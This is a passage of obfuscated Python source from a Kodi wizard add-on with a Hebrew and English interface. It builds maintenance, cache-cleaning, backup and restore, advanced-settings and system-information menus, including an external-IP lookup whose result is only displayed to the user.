	O00OOOOO00OOO0000 ='true'if THIRDPARTY =='true'else 'false'#line:3175
	if wiz .Grab_Log (True )==False :O00OOOOO0OOO00000 =0 #line:3176
	else :O00OOOOO0OOO00000 =errorChecking (wiz .Grab_Log (True ),True ,True )#line:3177
	if wiz .Grab_Log (True ,True )==False :OO0O0OOO000O00000 =0 #line:3178
	else :OO0O0OOO000O00000 =errorChecking (wiz .Grab_Log (True ,True ),True ,True )#line:3179
	OO0O0O0O000000000 =int (O00OOOOO0OOO00000 )+int (OO0O0OOO000O00000 )#line:3180
	O0O0O00OOO0OO0OO0 =str (OO0O0O0O000000000 )+' Error(s) Found'if OO0O0O0O000000000 >0 else 'None Found'#line:3181
	OOO00O00OO0O0O000 =': [COLOR red]Not Found[/COLOR]'if not os .path .exists (WIZLOG )else ": [COLOR green]%s[/COLOR]"%wiz .convertSize (os .path .getsize (WIZLOG ))#line:3182
	if OO00O0O0O0OO00000 =='true':#line:3183
		O000OOOOOO0000O00 ='true'#line:3184
		O00OOOO00OOO0OOO0 ='true'#line:3185
		OO000O00OO0OOOOO0 ='true'#line:3186
		OO00000O0000O000O ='true'#line:3187
		O0O0O00O0O0O000OO ='true'#line:3188
		O0O000O0O0OOOO00O ='true'#line:3189
		OO0OO00000OO00OOO ='true'#line:3190
		O0O0OO00OOO0000OO ='true'#line:3191
	else :#line:3192
		O000OOOOOO0000O00 ='true'if INCLUDEBOB =='true'else 'false'#line:3193
		O00OOOO00OOO0OOO0 ='true'if INCLUDEPHOENIX =='true'else 'false'#line:3194
		OO000O00OO0OOOOO0 ='true'if INCLUDESPECTO =='true'else 'false'#line:3195
		OO00000O0000O000O ='true'if INCLUDEGENESIS =='true'else 'false'#line:3196
		O0O0O00O0O0O000OO ='true'if INCLUDEEXODUS =='true'else 'false'#line:3197
		O0O000O0O0OOOO00O ='true'if INCLUDEONECHAN =='true'else 'false'#line:3198
		OO0OO00000OO00OOO ='true'if INCLUDESALTS =='true'else 'false'#line:3199
		O0O0OO00OOO0000OO ='true'if INCLUDESALTSHD =='true'else 'false'#line:3200
	O00O0O0OOOOOOOOOO =wiz .getSize (PACKAGES )#line:3201
	OOO000O0OOOO0O0O0 =wiz .getSize (THUMBS )#line:3202
	O00O00O00OOO0OO00 =wiz .getCacheSize ()#line:3203
	O0O00O00OOO0O0O0O =O00O0O0OOOOOOOOOO +OOO000O0OOOO0O0O0 +O00O00O00OOO0OO00 #line:3204
	O0O0OO0O0OOOOOO0O =['Daily','Always','3 Days','Weekly']#line:3205
	addDir ('[B]Cleaning Tools[/B]','maint','clean',icon =ICONMAINT ,themeit =THEME1 )#line:3206
	if view =="clean"or SHOWMAINT =='true':#line:3207
		addFile ('ניקוי מלא: [COLOR green][B]%s[/B][/COLOR]'%wiz .convertSize (O0O00O00OOO0O0O0O ),'fullclean',icon =ICONMAINT ,themeit =THEME3 )#line:3208
		addFile ('ניקוי קאש: [COLOR green][B]%s[/B][/COLOR]'%wiz .convertSize (O00O00O00OOO0OO00 ),'clearcache',icon =ICONMAINT ,themeit =THEME3 )#line:3209
		addFile ('ניקוי חבילות: [COLOR green][B]%s[/B][/COLOR]'%wiz .convertSize (O00O0O0OOOOOOOOOO ),'clearpackages',icon =ICONMAINT ,themeit =THEME3 )#line:3210
		addFile ('ניקוי תמונות: [COLOR green][B]%s[/B][/COLOR]'%wiz .convertSize (OOO000O0OOOO0O0O0 ),'clearthumb',icon =ICONMAINT ,themeit =THEME3 )#line:3211
		addFile ('ניקוי תמונות ישנות','oldThumbs',icon =ICONMAINT ,themeit =THEME3 )#line:3212
		addFile ('ניקוי קאש לוג','clearcrash',icon =ICONMAINT ,themeit =THEME3 )#line:3213
		addFile ('ניקוי חבילות ישנות','purgedb',icon =ICONMAINT ,themeit =THEME3 )#line:3214
		addFile ('התקנה נקיה','freshstart',icon =ICONMAINT ,themeit =THEME3 )#line:3215
	addDir ('[B]Addon Tools[/B]','maint','addon',icon =ICONMAINT ,themeit =THEME1 )#line:3216
	if view =="addon"or SHOWMAINT =='false':#line:3217
		addFile ('הסרת הרחבות','removeaddons',icon =ICONMAINT ,themeit =THEME3 )#line:3218
		addDir ('הסרת מידע הרחבות','removeaddondata',icon =ICONMAINT ,themeit =THEME3 )#line:3219
		addDir ('הפעלה או ביטול הרחבות','enableaddons',icon =ICONMAINT ,themeit =THEME3 )#line:3220
		addFile ('Enable/Disable Adult Addons','toggleadult',icon =ICONMAINT ,themeit =THEME3 )#line:3221
		addFile ('בודק עדכונים','forceupdate',icon =ICONMAINT ,themeit =THEME3 )#line:3222
		addFile ('Hide Passwords On Keyboard Entry','hidepassword',icon =ICONMAINT ,themeit =THEME3 )#line:3223
		addFile ('Unhide Passwords On Keyboard Entry','unhidepassword',icon =ICONMAINT ,themeit =THEME3 )#line:3224
	addDir ('[B]Misc Maintenance[/B]','maint','misc',icon =ICONMAINT ,themeit =THEME1 )#line:3225
	if view =="misc"or SHOWMAINT =='true':#line:3226
		addFile ('Kodi 17 Fix','kodi17fix',icon =ICONMAINT ,themeit =THEME3 )#line:3227
		addFile ('Reload Skin','forceskin',icon =ICONMAINT ,themeit =THEME3 )#line:3228
		addFile ('Reload Profile','forceprofile',icon =ICONMAINT ,themeit =THEME3 )#line:3229
		addFile ('Force Close Kodi','forceclose',icon =ICONMAINT ,themeit =THEME3 )#line:3230
		addFile ('Upload Kodi.log','uploadlog',icon =ICONMAINT ,themeit =THEME3 )#line:3231
		addFile ('View Errors in Log: %s'%(O0O0O00OOO0OO0OO0 ),'viewerrorlog',icon =ICONMAINT ,themeit =THEME3 )#line:3232
		addFile ('View Log File','viewlog',icon =ICONMAINT ,themeit =THEME3 )#line:3233
		addFile ('View Wizard Log File','viewwizlog',icon =ICONMAINT ,themeit =THEME3 )#line:3234
		addFile ('Clear Wizard Log File%s'%OOO00O00OO0O0O000 ,'clearwizlog',icon =ICONMAINT ,themeit =THEME3 )#line:3235
	addDir ('[B]שחזור וגיבוי[/B]','maint','backup',icon =ICONMAINT ,themeit =THEME1 )#line:3236
	if view =="backup"or SHOWMAINT =='true':#line:3237
		addFile ('Clean Up Back Up Folder','clearbackup',icon =ICONMAINT ,themeit =THEME3 )#line:3238
		addFile ('Back Up Location: [COLOR %s]%s[/COLOR]'%(COLOR2 ,MYBUILDS ),'settings','Maintenance',icon =ICONMAINT ,themeit =THEME3 )#line:3239
		addFile ('[גיבוי]: בילד','backupbuild',icon =ICONMAINT ,themeit =THEME3 )#line:3240
		addFile ('[גיבוי]: פרופילים','backupgui',icon =ICONMAINT ,themeit =THEME3 )#line:3241
		addFile ('[גיבוי]: סקינים','backuptheme',icon =ICONMAINT ,themeit =THEME3 )#line:3242
		addFile ('[גיבוי]: אדון דאטה','backupaddon',icon =ICONMAINT ,themeit =THEME3 )#line:3243
		addFile ('[שחזור]: בילד מתיקיה מקומית','restorezip',icon =ICONMAINT ,themeit =THEME3 )#line:3244
		addFile ('[שחזור]: פרופילים מתיקיה מקומית','restoregui',icon =ICONMAINT ,themeit =THEME3 )#line:3245
		addFile ('[שחזור]: אדון דאטה מתיקיה מקומית','restoreaddon',icon =ICONMAINT ,themeit =THEME3 )#line:3246
		addFile ('[שחזור]: בילד מתיקיה חיצונית','restoreextzip',icon =ICONMAINT ,themeit =THEME3 )#line:3247
		addFile ('[שחזור]: פרופילים מתיקיה חיצונית','restoreextgui',icon =ICONMAINT ,themeit =THEME3 )#line:3248
		addFile ('[שחזור]: אדון דאטה מתיקיה חיצונית','restoreextaddon',icon =ICONMAINT ,themeit =THEME3 )#line:3249
	addDir ('[B]System Tweaks/Fixes[/B]','maint','tweaks',icon =ICONMAINT ,themeit =THEME1 )#line:3250
	if view =="tweaks"or SHOWMAINT =='true':#line:3251
		if not ADVANCEDFILE =='http://'and not ADVANCEDFILE =='':#line:3252
			addDir ('Advanced Settings','advancedsetting',icon =ICONMAINT ,themeit =THEME3 )#line:3253
		else :#line:3254
			if os .path .exists (ADVANCED ):#line:3255
				addFile ('View Currect AdvancedSettings.xml','currentsettings',icon =ICONMAINT ,themeit =THEME3 )#line:3256
				addFile ('Remove Currect AdvancedSettings.xml','removeadvanced',icon =ICONMAINT ,themeit =THEME3 )#line:3257
			addFile ('Quick Configure AdvancedSettings.xml','autoadvanced',icon =ICONMAINT ,themeit =THEME3 )#line:3258
		addFile ('Scan Sources for broken links','checksources',icon =ICONMAINT ,themeit =THEME3 )#line:3259
		addFile ('Scan For Broken Repositories','checkrepos',icon =ICONMAINT ,themeit =THEME3 )#line:3260
		addFile ('Fix Addons Not Updating','fixaddonupdate',icon =ICONMAINT ,themeit =THEME3 )#line:3261
		addFile ('Remove Non-Ascii filenames','asciicheck',icon =ICONMAINT ,themeit =THEME3 )#line:3262
		addFile ('Convert Paths to special','convertpath',icon =ICONMAINT ,themeit =THEME3 )#line:3263
		addDir ('System Information','systeminfo',icon =ICONMAINT ,themeit =THEME3 )#line:3264
	addFile ('Show All Maintenance: %s'%O0OO000O0O0000O00 .replace ('true',OO0O00O000000O00O ).replace ('false',O0OO000O0OOOOO0OO ),'togglesetting','showmaint',icon =ICONMAINT ,themeit =THEME2 )#line:3265
	addDir ('[I]<< Return to Main Menu[/I]',icon =ICONMAINT ,themeit =THEME2 )#line:3266
	addFile ('Third Party Wizards: %s'%O00OOOOO00OOO0000 .replace ('true',OO0O00O000000O00O ).replace ('false',O0OO000O0OOOOO0OO ),'togglesetting','enable3rd',fanart =FANART ,icon =ICONMAINT ,themeit =THEME1 )#line:3267
	if O00OOOOO00OOO0000 =='true':#line:3268
		OOO0O0000O0O0O00O =THIRD1NAME if not THIRD1NAME ==''else 'Not Set'#line:3269
		OO000OOOO00O0O000 =THIRD2NAME if not THIRD2NAME ==''else 'Not Set'#line:3270
		O0OO0OO00OO0000OO =THIRD3NAME if not THIRD3NAME ==''else 'Not Set'#line:3271
		addFile ('Edit Third Party Wizard 1: [COLOR %s]%s[/COLOR]'%(COLOR2 ,OOO0O0000O0O0O00O ),'editthird','1',icon =ICONMAINT ,themeit =THEME3 )#line:3272
		addFile ('Edit Third Party Wizard 2: [COLOR %s]%s[/COLOR]'%(COLOR2 ,OO000OOOO00O0O000 ),'editthird','2',icon =ICONMAINT ,themeit =THEME3 )#line:3273
		addFile ('Edit Third Party Wizard 3: [COLOR %s]%s[/COLOR]'%(COLOR2 ,O0OO0OO00OO0000OO ),'editthird','3',icon =ICONMAINT ,themeit =THEME3 )#line:3274
	addFile ('ניקוי אוטומטי','',fanart =FANART ,icon =ICONMAINT ,themeit =THEME1 )#line:3275
	addFile ('ניקוי אוטומטי בהפעלה: %s'%OO00O00O000OOO0O0 .replace ('true',OO0O00O000000O00O ).replace ('false',O0OO000O0OOOOO0OO ),'togglesetting','autoclean',icon =ICONMAINT ,themeit =THEME3 )#line:3276
	if OO00O00O000OOO0O0 =='true':#line:3277
		addFile ('--- תדירות ניקוי: [B][COLOR green]%s[/COLOR][/B]'%O0O0OO0O0OOOOOO0O [AUTOFEQ ],'changefeq',icon =ICONMAINT ,themeit =THEME3 )#line:3278
		addFile ('--- ניקוי קאש בהפעלה: %s'%O0O00OO00O0OO000O .replace ('true',OO0O00O000000O00O ).replace ('false',O0OO000O0OOOOO0OO ),'togglesetting','clearcache',icon =ICONMAINT ,themeit =THEME3 )#line:3279
		addFile ('--- ניקוי חבילות בהפעלה: %s'%O0OO0O000OOOOOOOO .replace ('true',OO0O00O000000O00O ).replace ('false',O0OO000O0OOOOO0OO ),'togglesetting','clearpackages',icon =ICONMAINT ,themeit =THEME3 )#line:3280
		addFile ('--- ניקוי תמונות ישנות בהפעלה: %s'%O00O00OO0O0OO0O00 .replace ('true',OO0O00O000000O00O ).replace ('false',O0OO000O0OOOOO0OO ),'togglesetting','clearthumbs',icon =ICONMAINT ,themeit =THEME3 )#line:3281
	addFile ('ניקוי וידאו קאש','',fanart =FANART ,icon =ICONMAINT ,themeit =THEME1 )#line:3282
	addFile ('Include Video Cache in Clear Cache: %s'%OOOO00000OO00O00O .replace ('true',OO0O00O000000O00O ).replace ('false',O0OO000O0OOOOO0OO ),'togglecache','includevideo',icon =ICONMAINT ,themeit =THEME3 )#line:3283
	if OOOO00000OO00O00O =='true':#line:3284
		addFile ('--- Include All Video Addons: %s'%OO00O0O0O0OO00000 .replace ('true',OO0O00O000000O00O ).replace ('false',O0OO000O0OOOOO0OO ),'togglecache','includeall',icon =ICONMAINT ,themeit =THEME3 )#line:3285
		addFile ('--- Include Bob: %s'%O000OOOOOO0000O00 .replace ('true',OO0O00O000000O00O ).replace ('false',O0OO000O0OOOOO0OO ),'togglecache','includebob',icon =ICONMAINT ,themeit =THEME3 )#line:3286
		addFile ('--- Include Phoenix: %s'%O00OOOO00OOO0OOO0 .replace ('true',OO0O00O000000O00O ).replace ('false',O0OO000O0OOOOO0OO ),'togglecache','includephoenix',icon =ICONMAINT ,themeit =THEME3 )#line:3287
		addFile ('--- Include Specto: %s'%OO000O00OO0OOOOO0 .replace ('true',OO0O00O000000O00O ).replace ('false',O0OO000O0OOOOO0OO ),'togglecache','includespecto',icon =ICONMAINT ,themeit =THEME3 )#line:3288
		addFile ('--- Include Exodus: %s'%O0O0O00O0O0O000OO .replace ('true',OO0O00O000000O00O ).replace ('false',O0OO000O0OOOOO0OO ),'togglecache','includeexodus',icon =ICONMAINT ,themeit =THEME3 )#line:3289
		addFile ('--- Include Salts: %s'%OO0OO00000OO00OOO .replace ('true',OO0O00O000000O00O ).replace ('false',O0OO000O0OOOOO0OO ),'togglecache','includesalts',icon =ICONMAINT ,themeit =THEME3 )#line:3290
		addFile ('--- Include Salts HD Lite: %s'%O0O0OO00OOO0000OO .replace ('true',OO0O00O000000O00O ).replace ('false',O0OO000O0OOOOO0OO ),'togglecache','includesaltslite',icon =ICONMAINT ,themeit =THEME3 )#line:3291
		addFile ('--- Include One Channel: %s'%O0O000O0O0OOOO00O .replace ('true',OO0O00O000000O00O ).replace ('false',O0OO000O0OOOOO0OO ),'togglecache','includeonechan',icon =ICONMAINT ,themeit =THEME3 )#line:3292
		addFile ('--- Include Genesis: %s'%OO00000O0000O000O .replace ('true',OO0O00O000000O00O ).replace ('false',O0OO000O0OOOOO0OO ),'togglecache','includegenesis',icon =ICONMAINT ,themeit =THEME3 )#line:3293
		addFile ('--- Enable All Video Addons','togglecache','true',icon =ICONMAINT ,themeit =THEME3 )#line:3294
		addFile ('--- Disable All Video Addons','togglecache','false',icon =ICONMAINT ,themeit =THEME3 )#line:3295
	setView ('files','viewType')#line:3296
def advancedWindow (url =None ):#line:3298
	if not ADVANCEDFILE =='http://':#line:3299
		if url ==None :#line:3300
			OO00O000O00O000OO =wiz .workingURL (ADVANCEDFILE )#line:3301
			O000OOO00OO000OOO =uservar .ADVANCEDFILE #line:3302
		else :#line:3303
			OO00O000O00O000OO =wiz .workingURL (url )#line:3304
			O000OOO00OO000OOO =url #line:3305
		addFile ('Quick Configure AdvancedSettings.xml','autoadvanced',icon =ICONMAINT ,themeit =THEME3 )#line:3306
		if os .path .exists (ADVANCED ):#line:3307
			addFile ('View Currect AdvancedSettings.xml','currentsettings',icon =ICONMAINT ,themeit =THEME3 )#line:3308
			addFile ('Remove Currect AdvancedSettings.xml','removeadvanced',icon =ICONMAINT ,themeit =THEME3 )#line:3309
		if OO00O000O00O000OO ==True :#line:3310
			if HIDESPACERS =='No':addFile (wiz .sep (),'',icon =ICONMAINT ,themeit =THEME3 )#line:3311
			O000OO0OO0O0O0O0O =wiz .openURL (O000OOO00OO000OOO ).replace ('\n','').replace ('\r','').replace ('\t','')#line:3312
			O0O0OO0O000O000O0 =re .compile ('name="(.+?)".+?ection="(.+?)".+?rl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?escription="(.+?)"').findall (O000OO0OO0O0O0O0O )#line:3313
			if len (O0O0OO0O000O000O0 )>0 :#line:3314
				for OOO0OO0O000O000OO ,OOOO0000O0O0OO000 ,url ,OOO000OOO0O0OO00O ,OO0O0OO0O00OOOOO0 ,O000O00O0OOO0O0OO in O0O0OO0O000O000O0 :#line:3315
					if OOOO0000O0O0OO000 .lower ()=="yes":#line:3316
						addDir ("[B]%s[/B]"%OOO0OO0O000O000OO ,'advancedsetting',url ,description =O000O00O0OOO0O0OO ,icon =OOO000OOO0O0OO00O ,fanart =OO0O0OO0O00OOOOO0 ,themeit =THEME3 )#line:3317
					else :#line:3318
						addFile (OOO0OO0O000O000OO ,'writeadvanced',OOO0OO0O000O000OO ,url ,description =O000O00O0OOO0O0OO ,icon =OOO000OOO0O0OO00O ,fanart =OO0O0OO0O00OOOOO0 ,themeit =THEME2 )#line:3319
			else :wiz .log ("[Advanced Settings] ERROR: Invalid Format.")#line:3320
		else :wiz .log ("[Advanced Settings] URL not working: %s"%OO00O000O00O000OO )#line:3321
	else :wiz .log ("[Advanced Settings] not Enabled")#line:3322
def writeAdvanced (OOOOO00OO0OO00OO0 ,O0O0000O00OO000OO ):#line:3324
	O0000OOOO00O0O000 =wiz .workingURL (O0O0000O00OO000OO )#line:3325
	if O0000OOOO00O0O000 ==True :#line:3326
		if os .path .exists (ADVANCED ):O0O00000O0O0O000O =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like to overwrite your current Advanced Settings with [COLOR %s]%s[/COLOR]?[/COLOR]"%(COLOR2 ,COLOR1 ,OOOOO00OO0OO00OO0 ),yeslabel ="[B][COLOR green]Overwrite[/COLOR][/B]",nolabel ="[B][COLOR red]Cancel[/COLOR][/B]")#line:3327
		else :O0O00000O0O0O000O =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]האם תרצה להוריד ולהתקין [COLOR %s]%s[/COLOR]?[/COLOR]"%(COLOR2 ,COLOR1 ,OOOOO00OO0OO00OO0 ),yeslabel ="[B][COLOR green]התקנה[/COLOR][/B]",nolabel ="[B][COLOR red]ביטול[/COLOR][/B]")#line:3328
		if O0O00000O0O0O000O ==1 :#line:3330
			O0O0OO0OOOOO00OO0 =wiz .openURL (O0O0000O00OO000OO )#line:3331
			O0O000OO00OO00000 =open (ADVANCED ,'w');#line:3332
			O0O000OO00OO00000 .write (O0O0OO0OOOOO00OO0 )#line:3333
			O0O000OO00OO00000 .close ()#line:3334
			DIALOG .ok (ADDONTITLE ,'[COLOR %s]AdvancedSettings.xml file has been successfully written.  Once you click okay it will force close kodi.[/COLOR]'%COLOR2 )#line:3335
			wiz .killxbmc (True )#line:3336
		else :wiz .log ("[Advanced Settings] install canceled");wiz .LogNotify ('[COLOR %s]%s[/COLOR]'%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Write Cancelled![/COLOR]"%COLOR2 );return #line:3337
	else :wiz .log ("[Advanced Settings] URL not working: %s"%O0000OOOO00O0O000 );wiz .LogNotify ('[COLOR %s]%s[/COLOR]'%(COLOR1 ,ADDONTITLE ),"[COLOR %s]URL Not Working[/COLOR]"%COLOR2 )#line:3338
def viewAdvanced ():#line:3340
	O00O0O00O000000OO =open (ADVANCED )#line:3341
	O00OOOO0OOO00O000 =O00O0O00O000000OO .read ().replace ('\t','    ')#line:3342
	wiz .TextBox (ADDONTITLE ,O00OOOO0OOO00O000 )#line:3343
	O00O0O00O000000OO .close ()#line:3344
def removeAdvanced ():#line:3346
	if os .path .exists (ADVANCED ):#line:3347
		wiz .removeFile (ADVANCED )#line:3348
	else :LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]AdvancedSettings.xml not found[/COLOR]")#line:3349
def showAutoAdvanced ():#line:3351
	notify .autoConfig ()#line:3352
def getIP ():#line:3354
	OOO000O0OOOO0OO00 ='http://whatismyipaddress.com/'#line:3355
	if not wiz .workingURL (OOO000O0OOOO0OO00 ):return 'Unknown','Unknown','Unknown'#line:3356
	O0O0000OOO0OO0OOO =wiz .openURL (OOO000O0OOOO0OO00 ).replace ('\n','').replace ('\r','')#line:3357
	if not 'Access Denied'in O0O0000OOO0OO0OOO :#line:3358
		OOOOOO0OOO000OOO0 =re .compile ('whatismyipaddress.com/ip/(.+?)"').findall (O0O0000OOO0OO0OOO )#line:3359
		OOO0O0OO000O00O00 =OOOOOO0OOO000OOO0 [0 ]if (len (OOOOOO0OOO000OOO0 )>0 )else 'Unknown'#line:3360
		OO00O0O0OO00OO000 =re .compile ('"font-size:14px;">(.+?)</td>').findall (O0O0000OOO0OO0OOO )#line:3361
		O00O000O0OOOOOO00 =OO00O0O0OO00OO000 [0 ]if (len (OO00O0O0OO00OO000 )>0 )else 'Unknown'#line:3362
		O0O00O0O00O0O0000 =OO00O0O0OO00OO000 [1 ]+', '+OO00O0O0OO00OO000 [2 ]+', '+OO00O0O0OO00OO000 [3 ]if (len (OO00O0O0OO00OO000 )>2 )else 'Unknown'#line:3363
		return OOO0O0OO000O00O00 ,O00O000O0OOOOOO00 ,O0O00O0O00O0O0000 #line:3364
	else :return 'Unknown','Unknown','Unknown'#line:3365
def systemInfo ():#line:3367
	O0O00OOO00O000OO0 =['System.FriendlyName','System.BuildVersion','System.CpuUsage','System.ScreenMode','Network.IPAddress','Network.MacAddress','System.Uptime','System.TotalUptime','System.FreeSpace','System.UsedSpace','System.TotalSpace','System.Memory(free)','System.Memory(used)','System.Memory(total)']#line:3381
	O0OOO000O0O00O00O =[];O0OO0OO0O0O0OO0OO =0 #line:3382
	for O0O00OOOOOOOO00OO in O0O00OOO00O000OO0 :#line:3383
		O0OOO0000O000OO0O =wiz .getInfo (O0O00OOOOOOOO00OO )#line:3384
		OO0O0O0O000O0O00O =0 #line:3385
		while O0OOO0000O000OO0O =="Busy"and OO0O0O0O000O0O00O <10 :#line:3386
			O0OOO0000O000OO0O =wiz .getInfo (O0O00OOOOOOOO00OO );OO0O0O0O000O0O00O +=1 ;wiz .log ("%s sleep %s"%(O0O00OOOOOOOO00OO ,str (OO0O0O0O000O0O00O )));xbmc .sleep (1000 )#line:3387
		O0OOO000O0O00O00O .append (O0OOO0000O000OO0O )#line:3388
		O0OO0OO0O0O0OO0OO +=1 #line:3389
	OO00O0000OO000000 =O0OOO000O0O00O00O [8 ]if 'Una'in O0OOO000O0O00O00O [8 ]else wiz .convertSize (int (float (O0OOO000O0O00O00O [8 ][:-8 ]))*1024 *1024 )#line:3390
	O0O0OOO0OO0O000OO =O0OOO000O0O00O00O [9 ]if 'Una'in O0OOO000O0O00O00O [9 ]else wiz .convertSize (int (float (O0OOO000O0O00O00O [9 ][:-8 ]))*1024 *1024 )#line:3391
	O000OO0O0OO00OO0O =O0OOO000O0O00O00O [10 ]if 'Una'in O0OOO000O0O00O00O [10 ]else wiz .convertSize (int (float (O0OOO000O0O00O00O [10 ][:-8 ]))*1024 *1024 )#line:3392
	O000000O0O00OOOOO =wiz .convertSize (int (float (O0OOO000O0O00O00O [11 ][:-2 ]))*1024 *1024 )#line:3393
	O0OOOOOOOO0OOOO0O =wiz .convertSize (int (float (O0OOO000O0O00O00O [12 ][:-2 ]))*1024 *1024 )#line:3394
	OO0000OOO00OO0000 =wiz .convertSize (int (float (O0OOO000O0O00O00O [13 ][:-2 ]))*1024 *1024 )#line:3395
	O000OO0000OOOO0OO ,O0OOO0O0OOOOOOO0O ,OO0OO000O0000O0O0 =getIP ()#line:3396
	O0OO0000000O00OO0 =[];OO0OO000OO000O000 =[];O0OOO0OO00O0O0O0O =[];OOOO0O0OO00O00O00 =[];O000O00000OO00OO0 =[];O0O00O00OOO0OOOOO =[];O00OOO0OOOO0O00OO =[]#line:3398
	OOO0OOOOOO0O0OOOO =glob .glob (os .path .join (ADDONS ,'*/'))#line:3400
	for OOOOO0O00O00OOOOO in sorted (OOO0OOOOOO0O0OOOO ,key =lambda OO00O00OOO0O0O0OO :OO00O00OOO0O0O0OO ):#line:3401
		OOO00O00O00000000 =os .path .split (OOOOO0O00O00OOOOO [:-1 ])[1 ]#line:3402
		if OOO00O00O00000000 =='packages':continue #line:3403
		OO0O0000000000000 =os .path .join (OOOOO0O00O00OOOOO ,'addon.xml')#line:3404
		if os .path .exists (OO0O0000000000000 ):#line:3405
			O00OO00OOOO0O000O =open (OO0O0000000000000 )#line:3406
			O0O00O0O0OOO00000 =O00OO00OOOO0O000O .read ()#line:3407
			OO0OOO00O0000OOOO =re .compile ("<provides>(.+?)</provides>").findall (O0O00O0O0OOO00000 )#line:3408
			if len (OO0OOO00O0000OOOO )==0 :#line:3409
				if OOO00O00O00000000 .startswith ('skin'):O00OOO0OOOO0O00OO .append (OOO00O00O00000000 )#line:3410
				if OOO00O00O00000000 .startswith ('repo'):O000O00000OO00OO0 .append (OOO00O00O00000000 )#line:3411
				else :O0O00O00OOO0OOOOO .append (OOO00O00O00000000 )#line:3412
			elif not (OO0OOO00O0000OOOO [0 ]).find ('executable')==-1 :OOOO0O0OO00O00O00 .append (OOO00O00O00000000 )#line:3413
			elif not (OO0OOO00O0000OOOO [0 ]).find ('video')==-1 :O0OOO0OO00O0O0O0O .append (OOO00O00O00000000 )#line:3414
			elif not (OO0OOO00O0000OOOO [0 ]).find ('audio')==-1 :OO0OO000OO000O000 .append (OOO00O00O00000000 )#line:3415
			elif not (OO0OOO00O0000OOOO [0 ]).find ('image')==-1 :O0OO0000000O00OO0 .append (OOO00O00O00000000 )#line:3416
	addFile ('[B]Media Center Info:[/B]','',icon =ICONMAINT ,themeit =THEME2 )#line:3418
	addFile ('[COLOR %s]Name:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0OOO000O0O00O00O [0 ]),'',icon =ICONMAINT ,themeit =THEME3 )#line:3419
	addFile ('[COLOR %s]Version:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0OOO000O0O00O00O [1 ]),'',icon =ICONMAINT ,themeit =THEME3 )#line:3420
	addFile ('[COLOR %s]Platform:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,wiz .platform ().title ()),'',icon =ICONMAINT ,themeit =THEME3 )#line:3421
	addFile ('[COLOR %s]CPU Usage:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0OOO000O0O00O00O [2 ]),'',icon =ICONMAINT ,themeit =THEME3 )#line:3422
	addFile ('[COLOR %s]Screen Mode:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0OOO000O0O00O00O [3 ]),'',icon =ICONMAINT ,themeit =THEME3 )#line:3423
	addFile ('[B]Uptime:[/B]','',icon =ICONMAINT ,themeit =THEME2 )#line:3425
	addFile ('[COLOR %s]Current Uptime:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0OOO000O0O00O00O [6 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:3426
	addFile ('[COLOR %s]Total Uptime:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0OOO000O0O00O00O [7 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:3427
	addFile ('[B]Local Storage:[/B]','',icon =ICONMAINT ,themeit =THEME2 )#line:3429
	addFile ('[COLOR %s]Used Storage:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO00O0000OO000000 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3430
	addFile ('[COLOR %s]Free Storage:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0O0OOO0OO0O000OO ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3431
	addFile ('[COLOR %s]Total Storage:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O000OO0O0OO00OO0O ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3432
	addFile ('[B]Ram Usage:[/B]','',icon =ICONMAINT ,themeit =THEME2 )#line:3434
	addFile ('[COLOR %s]Used Memory:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O000000O0O00OOOOO ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3435
	addFile ('[COLOR %s]Free Memory:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0OOOOOOOO0OOOO0O ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3436
	addFile ('[COLOR %s]Total Memory:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO0000OOO00OO0000 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3437
	addFile ('[B]Network:[/B]','',icon =ICONMAINT ,themeit =THEME2 )#line:3439
	addFile ('[COLOR %s]Local IP:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0OOO000O0O00O00O [4 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:3440
	addFile ('[COLOR %s]External IP:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O000OO0000OOOO0OO ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3441
	addFile ('[COLOR %s]Provider:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0OOO0O0OOOOOOO0O ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3442
	addFile ('[COLOR %s]Location:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO0OO000O0000O0O0 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3443
	addFile ('[COLOR %s]MacAddress:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0OOO000O0O00O00O [5 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:3444
